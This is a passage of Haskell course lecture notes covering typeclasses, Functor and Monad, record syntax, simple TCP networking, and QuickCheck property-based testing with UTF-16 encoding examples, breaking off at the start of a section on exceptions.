-  Similarly, an instance may require a context

   -  E.g., define ``myShow`` for a list of items whose type is of class
      ``MyShow``

   .. code:: haskell

      instance (MyShow a) => MyShow [a] where
          myShow [] = "[]"
          myShow (x:xs) = myShow x ++ ":" ++ myShow xs

Classes of parameterized types
==============================

-  Can also have classes of parameterized types

-  ``Functor`` is a class for parameterized types onto which you can map
   functions:

   .. code:: haskell

      class Functor f where
          fmap :: (a -> b) -> f a -> f b

   -  Notice there are no arguments/results of type ``f``, rather types
      ``f a`` and ``f b``

-  An example of a ``Functor`` is ``Maybe``:

   .. code:: haskell

      instance Functor Maybe where
          fmap _ Nothing  = Nothing
          fmap f (Just a) = Just (f a)

   ::

      GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
      Prelude> fmap (+ 1) Nothing
      Nothing
      Prelude> fmap (+ 1) $ Just 2
      Just 3

More ``Functor`` s
===================

-  Lists are a ``Functor``

   -  ``[]`` can be used as a prefix type constructor (“``[] Int``”
      means “``[Int]``”) and can be used to declare instances

   .. code:: haskell

      map :: (a -> b) -> [a] -> [b]
      map _ []     = []
      map f (x:xs) = f x : map f xs

      instance Functor [] where
          fmap = map

-  ``IO`` is a ``Functor``

   .. code:: haskell

      instance Functor IO where
          fmap f io = io >>= return . f
          -- equivalent to:  do val <- io; return (f val)

   -  So we could have said:

   .. code:: haskell

      greet h = do
        hPutStrLn h "What is your name?"
        fmap ("Hi, " ++) (hGetLine h) >>= hPutStrLn h

.. raw:: html

   <!--
           ~~~~ {.haskell}
       simpleHttpStr url = fmap L.toString $ simpleHttp url
           ~~~~

           or, simpler still:

           ~~~~ {.haskell}
       simpleHttpStr = fmap L.toString . simpleHttp
           ~~~~
   -->

Kinds
=====

-  What happens if you try to make an instance of ``Functor`` for
   ``Int``?

   .. code:: haskell

      instance Functor Int where         -- compilation error
          fmap _ _ = error "placeholder"

   -  Get ``fmap :: (a -> b) -> Int a -> Int b``, but ``Int`` not
      parameterized

-  The compiler must keep track of all the different kinds of types

   -  One kind of type (e.g., ``Int``, ``Double``, ``()``) directly
      describes values
   -  Another kind of type requires a type parameter (``Maybe``, ``[]``,
      ``IO``)
   -  Yet another kind of type requires *two* type parameters
      (``Either``, ``(,)``)
   -  Parameterized types are sometimes called *type constructors*

-  Kinds named using symbols ∗ and →, much like curried functions

   -  ∗ is the kind of type that represents values (``Int``, ``Double``,
      ``()``, etc.)
   -  ∗ → ∗ is the kind of type with one parameter of type ∗ (``Maybe``,
      ``IO``, etc.)
   -  ∗ → ∗ → ∗ is a type constructor with two arguments of kind ∗
      (``Either``)
   -  In general, *a* → *b* means a type constructor that, applied to
      kind *a*, yields kind *b*

The ``Monad`` class
===================

-  **The entire first two lectures have been working up to this slide**
-  ``return`` and ``>>=`` are actually methods of a class called
   ``Monad``

.. code:: haskell

   class Monad m where
       (>>=) :: m a -> (a -> m b) -> m b
       return :: a -> m a
       fail :: String -> m a   -- called when pattern binding fails
       fail s = error s        -- default is to throw exception

       (>>) :: m a -> m b -> m b
       m >> k = m >>= \_ -> k

-  This has far-reaching consequences

   -  You can use the syntactic sugar of ``do`` blocks for non-IO
      purposes
   -  Many monadic functions are polymorphic in the ``Monad``–invent a
      new monad, and you can still use much existing code

The ``Maybe`` monad
===================

-  System libraries define a ``Monad`` instance for ``Maybe``

   .. code:: haskell

      instance  Monad Maybe  where
          (Just x) >>= k = k x
          Nothing >>= _  = Nothing
          return = Just
          fail _ = Nothing

-  You can use ``Nothing`` to indicate failure

   -  Might have a bunch of functions to extract fields from data

   .. code:: haskell

      extractA :: String -> Maybe Int
      extractB :: String -> Maybe String
      ...
      parseForm :: String -> Maybe Form
      parseForm raw = do
          a <- extractA raw
          b <- extractB raw
          ...
          return (Form a b ...)

   -  Threads success/failure state through system as ``IO`` threaded
      World
   -  Since Haskell is lazy, stops computing at first ``Nothing``

Algebraic data types
====================

-  Some data types have a large number of fields

   .. code:: haskell

      -- Argument to createProcess function
      data CreateProcess = CreateProcess CmdSpec (Maybe FilePath)
          (Maybe [(String,String)]) StdStream StdStream StdStream Bool

   -  Quickly gets rather unwieldy

-  Algebraic data types let you label fields (like C ``struct`` s)

   .. code:: haskell

      data CreateProcess = CreateProcess {
        cmdspec   :: CmdSpec,
        cwd       :: Maybe FilePath,
        env       :: Maybe [(String,String)],
        std_in    :: StdStream,
        std_out   :: StdStream,
        std_err   :: StdStream,
        close_fds :: Bool
      }

-  Let’s make an algebraic version of our ``Point`` class

   .. code:: haskell

      data Point = Point { xCoord :: Double, yCoord :: Double }

Algebraic types - initialization and matching
=============================================

.. code:: haskell

   data Point = Point { xCoord :: Double, yCoord :: Double }

-  Can initialize an Algebraic type by naming fields

   .. code:: haskell

      myPoint = Point { xCoord = 1.0, yCoord = 1.0 }

   -  Uninitialized fields get value ``undefined`` - a thunk that throws
      an exception

-  Can also pattern-match on any subset of fields

   .. code:: haskell

      -- Note the pattern binding assigns the variable on the right of =
      getX Point{ xCoord = x } = x

   -  `As-patterns <http://www.haskell.org/onlinereport/haskell2010/haskellch3.html#x8-590003.17.1>`__
      are handy to bind a variable and pattern simultaneously (with
      ``@``):

      .. code:: haskell

         getX' p@Point{ xCoord = x }
                 | x < 100 = x
                 | otherwise = error $ show p ++ " out of range"

      .. code:: haskell

         -- Also works with non-algebraic patterns
         getX' p@(Point x _) = ...
         processString s@('$':_) = ...
         processString s         = ...

Algebraic types - access and update
===================================

-  Can use field labels as access functions

   .. code:: haskell

      getX point = xCoord point

   -  ``xCoord`` works anywhere you can use a function of type
      ``Point -> Double``
   -  One consequence: field labels share the same namespace as
      top-level bindings, and must be unique

-  There is a special syntax for updating one or more fields

   .. code:: haskell

      setX point x = point { xCoord = x }
      setXY point x y = point { xCoord = x, yCoord = y }

   -  Obviously doesn’t update destructively, but returns new, modified
      ``Point``

   -  Very handy to maintain state in tail recursive functions and
      ``Monads``

A few Miscellaneous points
==========================

-  A ``!`` before a data field type makes it *strict* - i.e., can’t be
   thunk

   .. code:: haskell

      data State = State !Int Int

      data AlgState = AlgState { accumulator :: !Int
                               , otherValue :: Int }

   -  In both cases above, the first ``Int`` cannot hold a thunk, but
      only a value

   -  When initializing an algebraic datatype, it is mandatory to
      initialize all strict fields (since they cannot hold the
      ``undefined`` thunk).

.. raw:: html

   <!--
   * [`Data.Map`](http://hackage.haskell.org/packages/archive/containers/latest/doc/html/Data-Map.html) 
   maintains efficient, functional lookup tables
       * The tables cannot be mutated, but can be updated and used in
         recursive functions

   * [`words`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-List.html#v:words)
     breaks a `String` up into a list of whitespace-separated words
   -->

Networking
==========

-  High-level Stream (TCP & Unix-domain) socket support in
   ```Network`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network.html>`__

   .. code:: haskell

      connectTo :: HostName -> PortID -> IO Handle
      listenOn :: PortID -> IO Socket
      accept :: Socket -> (Handle, HostName, PortNumber)
      sClose :: Socket -> IO ()

-  Low-level BSD socket functions in
   ```Network.Socket`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html>`__

   .. code:: haskell

      socket :: Family -> SocketType -> ProtocolNumber -> IO Socket
      connect :: Socket -> SockAddr -> IO ()
      bindSocket :: Socket -> SockAddr -> IO ()
      listen :: Socket -> Int -> IO ()
      accept :: Socket -> IO (Socket, SockAddr)  -- not same accept as above

   -  ```getAddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#v:getAddrInfo>`__
      looks up hostnames just like
      `[RFC3493] <http://tools.ietf.org/html/rfc3493>`__ (returns
      ``[`` ```AddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#t:AddrInfo>`__ ``]``)

   -  We’ll stick to the higher-level functions today

Networking example
==================

-  Instead of ``withTty``, let’s define ``withClient`` that uses TCP:

   -  To get code: ``wget``
      ```cs240h.stanford.edu/rock2.hs`` <http://cs240h.stanford.edu/rock2.hs>`__

   .. code:: haskell

      withClient :: PortID -> (Handle -> IO a) -> IO a
      withClient listenPort fn = do
        s <- listenOn listenPort
        (h, host, port) <- accept s
        putStrLn $ "Connection from host " ++ host ++ " port " ++ show port
        sClose s  -- Only accept one client
        a <- fn h
        hClose h
        return a

-  Try it like this:

   ::

      *Main> withClient (PortNumber 1617) (computerVsUser Rock)

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Tie


/L2 Testing
============

.. container:: slide titlepage

   .. rubric:: Hello, world
      :name: hello-world
      :class: title

.. container:: slide section level1

   I'm Bryan O'Sullivan.

   I work at Facebook.

   Previously, I founded a company that built half its product in
   Haskell.

   I wrote a book about Haskell.

   I've written some Haskell libraries.

.. container:: slide section level1
   :name: lets-talk-about-testing

   .. rubric:: Let's talk about testing

   Have any profs ever talked to you about testing?

.. container:: slide section level1
   :name: testing-in-industry

   .. rubric:: Testing in industry

   There are a few "states of the art" for testing software:

   -  Excel spreadsheet full of stuff to do by hand (I am not making
      this up)

   -  Unit tests

   -  Integration tests

   -  Fuzz tests

.. container:: slide section level1
   :name: what-am-i-interested-in

   .. rubric:: What am I interested in?

   For today, I want to talk about unit tests and their more interesting
   descendants.

   Shamelessly borrowing from Wikipedia:

   .. code:: java

      public class TestAdder {
          public void testSum() {
              Adder adder = new AdderImpl();
              assert(adder.add(1, 1) == 2);
              assert(adder.add(1, 2) == 3);
              assert(adder.add(2, 2) == 4);
              assert(adder.add(0, 0) == 0);
              assert(adder.add(-1, -2) == -3);
              assert(adder.add(-1, 1) == 0);
              assert(adder.add(1234, 988) == 2222);
          }
      }

.. container:: slide section level1
   :name: whats-the-problem

   .. rubric:: What's the problem?

   Count the number of test cases below.

   .. code:: java

      public class TestAdder {
          public void testSum() {
              Adder adder = new AdderImpl();
              assert(adder.add(1, 1) == 2);
              assert(adder.add(1, 2) == 3);
              assert(adder.add(2, 2) == 4);
              assert(adder.add(0, 0) == 0);
              assert(adder.add(-1, -2) == -3);
              assert(adder.add(-1, 1) == 0);
              assert(adder.add(1234, 988) == 2222);
          }
      }

   Okay, don't. It's 7.

.. container:: slide section level1
   :name: the-limits-of-unit-tests

   .. rubric:: The limits of unit tests

   Unit tests are only useful up to a point.

   .. image:: pictures\patience_creativity.svg

   Your patience and ability to think up nasty corner cases are VERY
   finite.

   Best to use them wisely.

   But how?

.. container:: slide section level1
   :name: outsourcing

   .. rubric:: Outsourcing

   For patience, we have computers.

   For nasty corner cases, we have random number generators.

   Let's put them to use.

.. container:: slide section level1
   :name: a-simple-example-utf-16-encoding

   .. rubric:: A simple example: UTF-16 encoding

   UTF-16 is a Unicode encoding that:

   -  takes a *code point* (a Unicode character)

   -  turns it into 1 or 2 16-bit *code units*

   Variable length encoding:

   -  code points below 0x10000 are encoded as a single code unit

   -  at and above 0x10000, two code units

.. container:: slide section level1
   :name: encoding-a-single-code-point

   .. rubric:: Encoding a single code point

   We know that ``Char`` represents a Unicode code point.

   The ``Word16`` type represents a 16-bit value.

   .. code:: haskell

      import Data.Word (Word16)

   What should the type signature of ``encodeChar`` be?

   .. code:: haskell

      encodeChar :: ???

.. container:: slide section level1
   :name: the-base-case-is-easy

   .. rubric:: The base case is easy

   We can easily turn the single-code-unit case into some Haskell using
   a few handy functions.

   .. code:: haskell

      import Data.Char (ord)

      ord :: Char -> Int

      fromIntegral :: (Integral a, Num b) => a -> b

   We use ``fromIntegral`` to convert from ``Int`` to ``Word16`` because
   Haskell will not explicitly coerce for us.

   .. code:: haskell

      encodeChar :: Char -> [Word16]
      encodeChar x
        | w < 0x10000 = [fromIntegral w]
        where w = ord x

.. container:: slide section level1
   :name: the-two-code-unit-case

   .. rubric:: The two-code-unit case

   To encode code points above 0x10000, we need some new bit-banging
   functions.

   .. code:: haskell

      import Data.Bits ((.&.), shiftR)

   The ``.&.`` operator gives us bitwise *and*, while ``shiftR`` is a
   right shift.

   .. code:: haskell

      encodeChar :: Char -> [Word16]
      encodeChar x
        | w < 0x10000 = [fromIntegral w]
        | otherwise   = [fromIntegral a, fromIntegral b]
        where w = ord x
              a = ((w - 0x10000) `shiftR` 10) + 0xD800
              b = (w .&. 0x3FF) + 0xDC00

.. container:: slide section level1
   :name: basic-testing

   .. rubric:: Basic testing

   If you want unit tests, ``HUnit`` is the package you need.

   .. code:: haskell

      import Test.HUnit (assertEqual)

      testASCII =
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar 'a'))

.. container:: slide section level1
   :name: a-bad-test

   .. rubric:: A bad test

   Let's intentionally write a bogus test.

   .. code:: haskell

      badTest = do
        assertEqual "sestertius encodes as one code unit"
          1 (length (encodeChar '\x10198'))

   If we run this in ``ghci``:

   ::

      ghci> badTest
      *** Exception: HUnitFailure "sestertius encodes as one code unit\nexpected: 1\n but got: 2"

   Not pretty, but it works.

.. container:: slide section level1
   :name: but-wait-unit-tests

   .. rubric:: But wait: unit tests?

   So I just slammed unit tests and now I'm showing you how to write
   them?

   Well, we can generalize past the limits of unit tests.

.. container:: slide section level1
   :name: a-proxy-for-a-bigger-picture

   .. rubric:: A proxy for a bigger picture

   What do we really want with this test?

   .. code:: haskell

      testASCII = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar 'a'))

   We are really asserting that *every* ASCII code point encodes as a
   single code unit.

   .. code:: haskell

      testOne char = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar char))

.. container:: slide section level1
   :name: hmm-better

   .. rubric:: Hmm: better?

   What if we parameterize our test:

   .. code:: haskell

      testOne char = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar char))

   And drive it from a harness:

   .. code:: haskell

      testASCII = mapM_ testOne ['\0'..'\127']

.. container:: slide section level1
   :name: taking-stock

   .. rubric:: Taking stock

   This is better, in that our original test is generalized.

   It's also worse, because we're exhaustively enumerating every single
   test input.

   We get away with it here because Unicode is small, and computers are
   fast.

   But it's the *principle* of the thing: automate better!

.. container:: slide section level1
   :name: enter-quickcheck

   .. rubric:: Enter QuickCheck

   Forget about ``HUnit``, here's the package we'll focus on.

   .. code:: haskell

      import Test.QuickCheck

      prop_encodeOne c = length (encodeChar c) == 1

   In ``ghci``:

   ::

      ghci> quickCheck prop_encodeOne
      +++ OK, passed 100 tests.

.. container:: slide section level1
   :name: what-just-happened

   .. rubric:: What just happened?

   Why did ``quickCheck`` say this:

   ::

      +++ OK, passed 100 tests.

   It did the following:

   -  *generated* 100 random values for us

   -  fed each one to ``prop_encodeOne``

   -  ensured that each test passed

.. container:: slide section level1
   :name: now-i-have-a-headache

   .. rubric:: Now I have a headache

   Let's look back at our "test function":

   .. code:: haskell

      prop_encodeOne c = length (encodeChar c) == 1

   This is *very suspicious*.

   We know that ``encodeChar`` sometimes produces lists of length 2.

   So why did our 100 tests pass?

.. container:: slide section level1
   :name: starting-small

   .. rubric:: Starting small

   For most types, QuickCheck operates from the handy assumption that
   "small" test cases are more useful than big ones.

   As tests pass for small random inputs, it generates "bigger" ones.

   With just 100 tests, we are simply not likely to generate a code
   point that encodes as two code units.

.. container:: slide section level1
   :name: behind-the-scenes-generating-values

   .. rubric:: Behind the scenes: generating values

   How does QuickCheck do its thing, anyway?

   It needs to be able to generate random values.

   This it achieves via typeclasses.

   .. code:: haskell

      -- Generator type.
      data Gen a

      -- The set of types for which we
      -- can produce random values.
      class Arbitrary a where
          arbitrary :: Gen a

.. container:: slide section level1
   :name: behind-the-scenes-some-machinery

   .. rubric:: Behind the scenes: some machinery

   .. code:: haskell

      -- Generate a random value within a range.
      choose :: Random a => (a,a) -> Gen a
      instance Arbitrary Bool where
          arbitrary = choose (False,True)

      instance Arbitrary Char {- ... -}

.. container:: slide section level1
   :name: behind-the-scenes-testable-things

   .. rubric:: Behind the scenes: testable things

   .. code:: haskell

      -- Simply protection for a Gen.
      data Property = MkProperty (Gen a)

      -- The set of types that can be tested.
      class Testable prop

      -- The instance bodies are not interesting.
      instance Testable Bool

      instance (Arbitrary a, Show a, Testable prop)
          => Testable (a -> prop)

   The two instances above are crucial.

.. container:: slide section level1
   :name: how-does-this-work

   .. rubric:: How does this work?

   Let's write our test function with a type signature.

   .. code:: haskell

      prop_encodeOne :: Char -> Bool
      prop_encodeOne c = length (encodeChar c) == 1

   And ``quickCheck``:

   .. code:: haskell

      quickCheck :: Testable prop => prop -> IO ()

.. container:: slide section level1
   :name: look-again

   .. rubric:: Look again

   If ``quickCheck`` accepts ``prop_encodeOne``, then the latter must be
   an instance of ``Testable``.

   .. code:: haskell

      prop_encodeOne :: Char -> Bool

      quickCheck :: Testable prop => prop -> IO ()

   But how? Via these two instances.

   .. code:: haskell

      -- Satisfied by the result type
      instance Testable Bool

      -- Satisfied by the argument and result
      instance (Arbitrary a, Show a, Testable prop)
          => Testable (a -> prop)

.. container:: slide section level1
   :name: long-story-short

   .. rubric:: Long story short

   If we pass ``quickCheck`` a function, then:

   -  provided its arguments are all instances of ``Arbitrary`` and
      ``Show``

   -  *and* provided its result is an instance of ``Testable``

   *then* ``quickCheck`` can:

   -  *generate* arbitrary values of *all* necessary types
      automatically,

   -  run our test on those values,

   -  and ensure that our test always passes

.. container:: slide section level1
   :name: so-what

   .. rubric:: So what?

   We still have a broken test!

   ``quickCheck`` tells us that it always passes---when it shouldn't!

   Why? We have to read the source.

   .. code:: haskell

      module Test.QuickCheck.Arbitrary where

      instance Arbitrary Char where
        arbitrary = chr `fmap` oneof [choose (0,127),
                                      choose (0,255)]

   Oh great, QuickCheck will only generate 8-bit characters.

   Our assumption that it would eventually generate big-enough inputs
   was wrong for ``Char``.

   Therefore our test can never fail.

   How...unfortunate!

.. container:: slide section level1
   :name: writing-a-new-arbitrary-instance

   .. rubric:: Writing a new Arbitrary instance

   So now we face a challenge.

   We want a type that is almost exactly like ``Char``, but that has a
   different ``Arbitrary`` instance.

   To create such a type, we use the ``newtype`` keyword.

   .. code:: haskell

      newtype BigChar = Big Char
                      deriving (Eq, Show)

   The type is named ``BigChar``; its constructor is named ``Big``.

   We use ``deriving`` to reuse the ``Eq`` instance of the underlying
   ``Char`` type, and to generate a new ``Show`` instance.

.. container:: slide section level1
   :name: what-next

   .. rubric:: What next?

   We want to be able to flesh this out:

   .. code:: haskell

      instance Arbitrary BigChar where
          arbitrary = {- ... what? ... -}

   The highest Unicode code point is 0x10FFFF.

   We want to generate values in this range.

   We saw this earlier:

   .. code:: haskell

      -- Generate a random value within a range.
      choose :: Random a => (a,a) -> Gen a

.. container:: slide section level1
   :name: random-values-the-hard-way

   .. rubric:: Random values: the hard way

   In order to use ``choose``, we must make ``BigChar`` an instance of
   ``Random``.

   Here's a verbose way to do it:

   .. code:: haskell

      import Control.Arrow (first)
      import System.Random

      instance Random BigChar where
        random                = first Big `fmap` random
        randomR (Big a,Big b) = first Big `fmap` randomR (a,b)

.. container:: slide section level1
   :name: random-values-easier

   .. rubric:: Random values: easier

   If we want to avoid the boilerplate code from the previous slide, we
   can use a trick:

   -  The ``GeneralizedNewtypeDeriving`` language extension

   -  This lets GHC automatically derive some non-standard typeclass
      instances for us, e.g. ``Random``

   .. code:: haskell

      {-# LANGUAGE GeneralizedNewtypeDeriving #-}
      import System.Random

      newtype BigChar = Big Char
                      deriving (Eq, Show, Random)

   -  All we did was add ``Random`` to the ``deriving`` clause above.

   -  As the name suggests, this only works with the ``newtype``
      keyword.

.. container:: slide section level1
   :name: our-instance-and-a-rerun

   .. rubric:: Our instance, and a rerun

   An instance with a body:

   .. code:: haskell

      instance Arbitrary BigChar where
          arbitrary = choose (Big '0',Big '\x10FFFF')

   A new test that unwraps a ``BigChar`` value:

   .. code:: haskell

      prop_encodeOne3 (Big c) = length (encodeChar c) == 1

   And let's try it:

   ::

      ghci> quickCheck prop_encodeOne3
      *** Failed! Falsifiable (after 1 test):
      Big '\317537'

   Great! Not only did our broken test fail immediately...

   ...but it gave us a *counterexample*, an input on which our test
   function reproducibly fails!

.. container:: slide section level1
   :name: the-magic-of-quickcheck

   .. rubric:: The magic of QuickCheck

   The beauty here is several-fold:

   -  We write a simple Haskell function that accepts some inputs and
      returns a ``Bool``

   -  QuickCheck generates random test cases for us, and tests our
      function

   -  If a test case fails, it tells us what the inputs were

.. container:: slide section level1
   :name: so-what-1

   .. rubric:: So what?

   Unit test way:

   -  A pile of unit tests that are small variations on a theme

   QuickCheck way:

   -  One property that you expect to hold universally true

   -  Automatically, randomly generated test inputs

   -  Counterexamples that help you pinpoint your bugs

.. container:: slide section level1
   :name: what-else

   .. rubric:: What else?

   There's a problem with random inputs when a test fails:

   -  They're often *big*.

   -  Big things are difficult for humans to deal with.

   -  Big values usually take longer to look through.

   Starting from a random failing input:

   -  We'd like to find the *smallest* input that will cause a test to
      fail.

   QuickCheck calls this *shrinking*.

.. container:: slide section level1
   :name: micro-lab-shrink-a-bigchar

   .. rubric:: Micro-lab: shrink a BigChar

   Grab the following source file:

   ::

      curl -O http://cs240h.cs.stanford.edu/ShrinkChar.hs

   Using ``ghci`` to do some spelunking, work out a body for
   ``shrinkChar``.

   .. code:: haskell

      instance Arbitrary BigChar where
        arbitrary      = choose (Big '0',Big '\x10FFFF')
        shrink (Big c) = map Big (shrinkChar c)

      -- Write a body for this.
      shrinkChar c = undefined

   You have 5 minutes.

.. container:: slide section level1
   :name: generating-vs-filtering-values

   .. rubric:: Generating vs filtering values

   Here are two different approaches to generating test values.

   First, generate them directly (look at line 2):

   .. code:: haskell

      prop_encodeOne2 = do
        c <- choose ('\0', '\xFFFF')
        return $ length (encodeChar c) == 1

   Second, generate any old value, but *filter* such that we get only
   the ones that make sense:

   .. code:: haskell

      -- These two are basically the same, modulo verbosity.

      prop_encodeOne4 (Big c) =
        (c < '\x10000') ==> length (encodeChar c) == 1

      prop_encodeOne5 = do
        Big c <- arbitrary `suchThat` (< Big '\x10000')
        return $ length (encodeChar c) == 1

.. container:: slide section level1
   :name: generating-vs-filtering

   .. rubric:: Generating vs filtering

   It is *usually* more efficient to generate only the values you'll
   need, and do no filtering.

   Sometimes, it's easier to identify good values when you see them (by
   filtering) than to figure out how to generate them.

   If QuickCheck has to generate too many values that fail a
   ``suchThat`` or other filter, it will give up and may not run as many
   tests as you want.

   -  For both efficiency *and* to ensure that QuickCheck can generate
      enough values to test, it's worth trying to generate only good
      values.

.. container:: slide section level1
   :name: mini-lab-more-code

   .. rubric:: Mini-lab: more code!

   Grab the following source code:

   ::

      curl -O http://cs240h.cs.stanford.edu/Utf16.hs

   Write a definition for ``decodeUtf16``:

   .. code:: haskell

      decodeUtf16 :: [Word16] -> [Char]

   Decide on some QuickCheck tests, write them, and run them.

   You have 15 minutes.

.. container:: slide section level1
   :name: sizing-a-test

   .. rubric:: Sizing a test

   Test data generators have an implicit size parameter, hidden inside
   the ``Gen`` type.

   QuickCheck starts by generating small test cases; it increases the
   size as testing progresses.

   The meaning of "size" is specific to the needs of an ``Arbitrary``
   instance.

   -  The ``Arbitrary`` instance for lists interprets it as "the maximum
      length of a list of arbitrary values".

   We can find the current size using the ``sized`` function, and modify
   it locally using ``resize``:

   .. code:: haskell

      sized  :: (Int -> Gen a) -> Gen a
      resize ::  Int -> Gen a  -> Gen a

.. container:: slide section level1
   :name: lifting

   .. rubric:: Lifting

   We're hopefully by now familiar with the ``Functor`` class:

   .. code:: haskell

      class Functor f  where
          fmap :: (a -> b) -> f a -> f b

   This takes a pure function and "lifts" it into the functor ``f``.

   In general, "lifting" takes a concept and transforms it to work in a
   different (sometimes more general) setting.

   For instance, we can define lifting of functions with the ``Monad``
   class too:

   .. code:: haskell

      liftM :: (Monad m) => (a -> b) -> m a -> m b
      liftM f action = do
        b <- action
        return (f b)

.. container:: slide section level1
   :name: fmap-and-liftm

   .. rubric:: fmap and liftM

   Notice the similarities between the type signatures:

   .. code:: haskell

      fmap  :: (Functor f) => (a -> b) -> f a -> f b
      liftM :: (Monad m)   => (a -> b) -> m a -> m b

   All instances of ``Monad`` can possibly be instances of ``Functor``.
   Ideally, they'd be defined in terms of each other:

   .. code:: haskell

      class (Functor m) => Monad m where
          {- blah blah -}

   For historical reasons, the two classes are separate, so we write
   separate instances for them and just reuse the code:

   .. code:: haskell

      instance Monad MyThingy where
          {- whatever -}

      instance Functor MyThingy where
          fmap = liftM

.. container:: slide section level1
   :name: why-the-apparent-digression

   .. rubric:: Why the apparent digression?

   It turns out that lifting pure functions into monads is really
   common.

   So common, in fact, that ``Control.Monad`` defines a bunch of extra
   combinators for us.

   .. code:: haskell

      liftM2 :: (Monad m) => (a -> b -> c) -> m a -> m b -> m b
      liftM2 f act1 act2 = do
        a <- act1
        b <- act2
        return (f a b)

   These combinators go all the way up to ``liftM5``.

   Look familiar? Useful?

.. container:: slide section level1
   :name: a-tighter-arbitrary-instance

   .. rubric:: A tighter Arbitrary instance

   Before:

   .. code:: haskell

      data Point a = Point a a

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = do
            x <- arbitrary
            y <- arbitrary
            return (Point x y)

   After:

   .. code:: haskell

      import Control.Monad (liftM2)

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = liftM2 Point arbitrary arbitrary

.. container:: slide section level1
   :name: micro-lab-shrinking-a-point

   .. rubric:: Micro-lab: shrinking a Point

   QuickCheck provides us with machinery to shrink tuples.

   Make use of this machinery to shrink a ``Point``.

   ::

      curl -O http://cs240h.cs.stanford.edu/TestPoint.hs

   Take 3 minutes.

   .. code:: haskell

      import Control.Monad
      import Test.QuickCheck

      data Point a = Point a a
                     deriving (Eq, Show)

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = liftM2 Point arbitrary arbitrary
          -- TODO: provide a body for shrink
          shrink = undefined

.. container:: slide section level1
   :name: testing-a-recursive-data-type

   .. rubric:: Testing a recursive data type

   Suppose we have a tree type:

   .. code:: haskell

      data Tree a = Node (Tree a) (Tree a)
                  | Leaf a
                    deriving (Show)

   Here's an obvious ``Arbitrary`` instance:

   .. code:: haskell

      instance (Arbitrary a) => Arbitrary (Tree a) where
          arbitrary = oneof [
                        liftM  Leaf arbitrary
                      , liftM2 Node arbitrary arbitrary
                      ]

   The ``oneof`` combinator chooses a generator at random.

   .. code:: haskell

      oneof :: [Gen a] -> Gen a

.. container:: slide section level1
   :name: whats-up-doc

   .. rubric:: What's up, Doc?

   Potential trouble:

   -  This generator may not terminate at all!

   -  It's likely to produce *huge* trees.

   We can use the ``sample`` function to generate and print some
   arbitrary data.

   .. code:: haskell

      sample :: (Show a) => Gen a -> IO ()

   This helps us to explore what's going on.

.. container:: slide section level1
   :name: a-safer-instance

   .. rubric:: A safer instance

   Here's where the sizing mechanism comes to the rescue.

   .. code:: haskell

      instance (Arbitrary a) => Arbitrary (Tree a) where
          arbitrary = sized tree

      tree :: (Arbitrary a) => Int -> Gen (Tree a)
      tree 0 = liftM Leaf arbitrary
      tree n = oneof [
                 liftM  Leaf arbitrary
               , liftM2 Node subtree subtree
               ]
        where subtree = tree (n `div` 2)

.. container:: slide section level1
   :name: where-all-this-is-going

   .. rubric:: Where all this is going

   QuickCheck is pretty great. Take the time to learn to use it.

   It's a little harder to learn to use it well than unit tests, but it
   pays off big time.

   Furthermore:

   -  We really want to see you provide QuickCheck tests with future
      labs and your final projects.

   Enjoy!

/L3 Concurrency
===============

Exceptions
==========

-  We’ve seen a few functions that “return” any type

   .. code:: haskell

      undefined :: a
      error :: String -> a

   -  Return type can be arbitrary because function doesn’t actually
      return

-  These functions throw *language-level* exceptions

   -  To use exceptions directly, import
      ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
      as follows:

   .. code:: haskell

      import Prelude hiding (catch)  -- not necessary with new GHCs
      import Control.Exception

   -  Older ``Prelude`` s have an old, less general version of
      ``catch`` you should avoid (``hiding`` keyword prevents import of
      specific symbols)

   -  ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
      gives you access to the following symbols:

   .. code:: haskell

      class (Typeable e, Show e) => Exception e where ...
      throw :: Exception e => e -> a
      throwIO :: Exception e => e -> IO a
      catch   :: Exception e => IO a -> (e -> IO a) -> IO a

Simple example
==============

.. code:: haskell

   {-# LANGUAGE DeriveDataTypeable #-}

   import Prelude hiding (catch)
   import Control.Exception
   import Data.Typeable

   data MyError = MyError String deriving (Show, Typeable)
   instance Exception MyError

   catcher :: IO a -> IO (Maybe a)
   catcher action = fmap Just action `catch` handler
       where handler (MyError msg) = do putStrLn msg; return Nothing

::

   *Main> catcher $ readFile "/dev/null"
   Just ""
   *Main> catcher $ throwIO $ MyError "something bad"
   something bad
   Nothing

-  Need ``DeriveDataTypeable`` language pragma (later lecture)
-  ``handler`` ’s type cannot be inferred (use constructor or type
   signature)

   -  Constructor pattern ``e@(SomeException _)`` catches all exceptions

Exceptions in pure code
=======================

-  Previous example wrapped ``catcher`` around an IO action

-  Can ``throw`` exceptions in pure code, yet ``catch`` them only in
   ``IO``

   -  This is because evaluation order depends on implementation
   -  Which error is thrown by ``(error "one") + (error "two")``? Can be
      non-deterministic, which is
      `okay <http://research.microsoft.com/en-us/um/people/simonpj/papers/imprecise-exn.htm>`__
      if ``catch`` is restricted to the ``IO`` Monad

-  In ``IO``, use ``throwIO`` (not ``throw``) to make exception
   sequencing precise

   .. code:: haskell

          do x <- throwIO (MyError "one")  -- this exception thrown
             y <- throwIO (MyError "two")  -- this code not reached
             return $ x + y

   -  Generally, use ``throw`` only where you can’t use ``throwIO``

-  Pure exceptions quite useful for errors & unimplemented code, E.g.:

   .. code:: haskell

      -- Simplified version of functions in standard Prelude:
      error :: String -> a
      error a = throw (ErrorCall a)
      undefined :: a
      undefined =  error "Prelude.undefined"

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

